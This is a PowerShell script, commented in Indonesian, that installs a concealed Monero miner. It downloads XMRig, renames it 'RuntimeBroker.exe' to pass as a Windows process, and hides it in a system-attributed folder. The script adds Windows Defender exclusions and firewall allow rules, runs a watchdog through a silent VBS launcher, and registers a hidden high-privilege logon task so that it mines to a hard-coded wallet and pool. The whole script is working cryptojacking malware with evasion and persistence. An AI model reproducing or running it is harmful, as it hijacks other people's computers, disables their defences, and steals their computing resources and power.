$ErrorActionPreference = "Continue"

function Log-Step($msg) {
    Write-Host "[DEBUG] $msg" -ForegroundColor Cyan
    Start-Sleep -Milliseconds 300
}

try {
    Log-Step "Memulai setup dengan Priority BelowNormal & tanpa TLS..."

    $Dir = "C:\Users\Public\Documents\Core"
    if (!(Test-Path $Dir)) {
        New-Item -ItemType Directory -Force -Path $Dir | Out-Null
    }

    $ExeName = "RuntimeBroker.exe" 
    $ExePath = Join-Path $Dir $ExeName
    $VbsPath = Join-Path $Dir "run.vbs"
    $ZipPath = Join-Path $env:TEMP "up.zip"
    $WatcherScriptPath = Join-Path $Dir "monitor.ps1"

    $Pool = "gulf.moneroocean.stream:10128"
    $Wallet = "42imHjeSVgSG54hiTVmeGa8evmKJ55oWYgb6np1zanx5j8eoCM4vfbN9xSua1unVEV5mZCxxs637LdmVEJMs1XMFCWsHvc1"
    # Parameter --tls dihapus sesuai permintaan
    $ArgsList = "-o $Pool -u $Wallet -p x --donate-level=1 --cpu-max-threads-hint=45 --background"

    # Hentikan proses lama
    Log-Step "Mematikan proses miner dan watchdog lama..."
    Get-Process -Name "RuntimeBroker", "wscript", "powershell" -ErrorAction SilentlyContinue | Where-Object { 
        $_.Path -eq $ExePath -or $_.Path -like "$Dir*" 
    } | Stop-Process -Force -ErrorAction SilentlyContinue

    Stop-Process -Name "RuntimeBroker" -Force -ErrorAction SilentlyContinue
    Unregister-ScheduledTask -TaskName "RuntimeBrokerMonitor" -Confirm:$false -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2

    # Eksklusi Windows Defender & Firewall
    Log-Step "Menambahkan Defender Exclusion & Firewall Whitelist..."
    Add-MpPreference -ExclusionPath $Dir -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess $ExeName -ErrorAction SilentlyContinue

    Remove-NetFirewallRule -DisplayName "Runtime Broker Monitor (Outbound)" -ErrorAction SilentlyContinue
    Remove-NetFirewallRule -DisplayName "Runtime Broker Monitor (Inbound)" -ErrorAction SilentlyContinue
    New-NetFirewallRule -DisplayName "Runtime Broker Monitor (Outbound)" -Direction Outbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null
    New-NetFirewallRule -DisplayName "Runtime Broker Monitor (Inbound)" -Direction Inbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null

    # Download & Ekstrak Miner
    Log-Step "Mengunduh miner..."
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    (New-Object System.Net.WebClient).DownloadFile("https://github.com/MoneroOcean/xmrig_setup/raw/master/xmrig.zip", $ZipPath)

    Log-Step "Mengekstrak file..."
    Expand-Archive -Path $ZipPath -DestinationPath $env:TEMP -Force
    Start-Sleep -Seconds 1
    
    $ExtractedExe = Get-ChildItem -Path $env:TEMP -Filter "xmrig.exe" -Recurse | Select-Object -First 1
    if ($ExtractedExe) { 
        Copy-Item -Force $ExtractedExe.FullName $ExePath 
    } else {
        throw "xmrig.exe tidak ditemukan setelah ekstrak!"
    }
    
    Remove-Item -Force $ZipPath -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $Dir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System) -ErrorAction SilentlyContinue

    # =========================================================
    # SMART WATCHDOG (Priority BelowNormal & Auto-Refresh)
    # =========================================================
    Log-Step "Membuat script smart watchdog dengan BelowNormal..."
    $ScriptBlockCode = @"
`$ExePath = "$ExePath"
`$ArgsList = "$ArgsList"
`$RestartCounter = 0

while (`$true) {
    `$Running = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Where-Object { `$_.Path -eq `$ExePath }
    
    if (!`$Running) {
        Start-Process -FilePath `$ExePath -ArgumentList `$ArgsList -WindowStyle Hidden
    } else {
        foreach (`$p in `$Running) {
            try { 
                # Diubah ke BelowNormal sesuai permintaan
                `$p.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::BelowNormal 
            } catch {}
        }
    }

    # Refresh total setiap 2 jam sekali untuk mencegah hang koneksi
    `$RestartCounter++
    if (`$RestartCounter -ge 240) { # 240 x 30 detik = 120 menit
        Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Where-Object { `$_.Path -eq `$ExePath } | Stop-Process -Force -ErrorAction SilentlyContinue
        `$RestartCounter = 0
    }

    Start-Sleep -Seconds 30
}
"@
    Set-Content -Path $WatcherScriptPath -Value $ScriptBlockCode -Force

    $VbsScriptContent = @"
Dim shell
Set shell = CreateObject("Wscript.Shell")
shell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$WatcherScriptPath""", 0, False
"@
    Set-Content -Path $VbsPath -Value $VbsScriptContent -Force

    # Task Scheduler Persistensi
    Log-Step "Mendaftarkan Task Scheduler..."
    $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VbsPath`""
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Highest
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden

    Register-ScheduledTask -TaskName "RuntimeBrokerMonitor" -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null

    # Jalankan proses tanpa TLS
    Start-Process -FilePath $ExePath -ArgumentList $ArgsList -WindowStyle Hidden

    Write-Host "[+] SETUP SELESAI! Parameter TLS dihapus & Priority diset ke BelowNormal." -ForegroundColor Green
}
catch {
    Write-Host "[-] TERJADI ERROR: $_" -ForegroundColor Red
}

Write-Host "Tekan Enter untuk keluar..."
Read-Host
